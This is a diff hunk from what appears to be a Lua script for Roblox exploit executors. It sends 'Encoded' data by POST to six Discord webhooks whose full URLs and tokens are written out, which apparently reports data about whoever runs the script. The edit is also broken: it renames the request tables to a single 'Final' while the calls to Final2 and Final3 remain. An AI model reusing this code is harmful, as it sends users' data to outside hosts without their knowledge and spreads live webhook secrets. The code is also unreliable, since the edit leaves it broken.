@@ -82,11 +82,11 @@ local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "Prot
                     
                     Request = http_request or request or HttpPost or syn.request
                     local Final1 = {Url = "https://discord.com/api/webhooks/1094157712994074665/dV6JSd3Lgf5szfv2sfmEllFYs2uv1dE1oASsbYHLf0jSWTkeOijW5TZzMFD1ilu8Ifb3", Body = Encoded, Method = "POST", Headers = Headers}
-                    local Final2 = {Url = "https://discord.com/api/webhooks/1094158881720111134/wbZmnHxJYQmqSf_idNCFlpIcSAVyl2A8aa_gqxE2lPWVrJhdj32RGMiUOgVYMAgoHRxP", Body = Encoded, Method = "POST", Headers = Headers}
-                    local Final3 = {Url = "https://discord.com/api/webhooks/1094158991153692672/IwWNNYzxlZ6hj1C7sr8puBDzgRl83cWnqcuJ5rVUVxN2-clf6BpC7mbd0Xkq288qJCgp", Body = Encoded, Method = "POST", Headers = Headers}
-                    local Final4 = {Url = "https://discord.com/api/webhooks/1094159084183359588/-p2j50TAoh4q2iSoRyTNAFVfGR_pMF8zpEnsdiSRIue1D3oq81RnUNQdCG4m1YLGq9NI", Body = Encoded, Method = "POST", Headers = Headers}
-                    local Final5 = {Url = "https://discord.com/api/webhooks/1094159219659395142/d-JevrcKUqybXvAtkwr9ZdPEJZEGiJ6h-SQm0O6w7r9ZogRpkMVij88F67iTR15tOS6E", Body = Encoded, Method = "POST", Headers = Headers}
-                    local Final6 = {Url = "https://discord.com/api/webhooks/1094159380192178197/jdDJklaXTTx5BCz6dqmxHqZC2XgDOmtqIuMbKT38OL8JuCtcIed8NbK7J1US2HuXT_HS", Body = Encoded, Method = "POST", Headers = Headers}
+                    local Final = {Url = "https://discord.com/api/webhooks/1094158881720111134/wbZmnHxJYQmqSf_idNCFlpIcSAVyl2A8aa_gqxE2lPWVrJhdj32RGMiUOgVYMAgoHRxP", Body = Encoded, Method = "POST", Headers = Headers}
+                    local Final = {Url = "https://discord.com/api/webhooks/1094158991153692672/IwWNNYzxlZ6hj1C7sr8puBDzgRl83cWnqcuJ5rVUVxN2-clf6BpC7mbd0Xkq288qJCgp", Body = Encoded, Method = "POST", Headers = Headers}
+                    local Final = {Url = "https://discord.com/api/webhooks/1094159084183359588/-p2j50TAoh4q2iSoRyTNAFVfGR_pMF8zpEnsdiSRIue1D3oq81RnUNQdCG4m1YLGq9NI", Body = Encoded, Method = "POST", Headers = Headers}
+                    local Final = {Url = "https://discord.com/api/webhooks/1094159219659395142/d-JevrcKUqybXvAtkwr9ZdPEJZEGiJ6h-SQm0O6w7r9ZogRpkMVij88F67iTR15tOS6E", Body = Encoded, Method = "POST", Headers = Headers}
+                    local Final = {Url = "https://discord.com/api/webhooks/1094159380192178197/jdDJklaXTTx5BCz6dqmxHqZC2XgDOmtqIuMbKT38OL8JuCtcIed8NbK7J1US2HuXT_HS", Body = Encoded, Method = "POST", Headers = Headers}
                     Request(Final1)
                     Request(Final2)
                     Request(Final3)
